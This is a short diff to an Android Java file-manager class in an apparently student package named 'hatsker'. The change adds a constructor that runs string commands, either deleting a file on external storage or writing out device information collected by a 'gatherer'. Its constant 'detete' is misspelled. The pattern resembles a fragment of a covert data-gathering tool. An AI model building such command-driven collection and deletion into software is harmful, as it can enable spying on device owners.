@@ -1,6 +1,7 @@
 package com.example.student.hatsker;
 
 
+import android.content.Context;
 import android.os.Environment;
 import java.io.File;
 import java.io.FileWriter;
@@ -12,6 +13,20 @@ public class FileManager {
     File tempFile;
     File path = Environment.getExternalStorageDirectory();
 
+
+    private final String DELETE = "detete";
+    private final String REWRITE = "rewrite";
+
+    public FileManager(String cmd, Context context)
+    {
+        switch(cmd)
+        {
+            case DELETE: delete();
+                break;
+            case REWRITE: rewrite(new GathererBuilder().build(cmd, context).getInfo());
+                break;
+        }
+    }
 
     public void rewrite(String string){
 
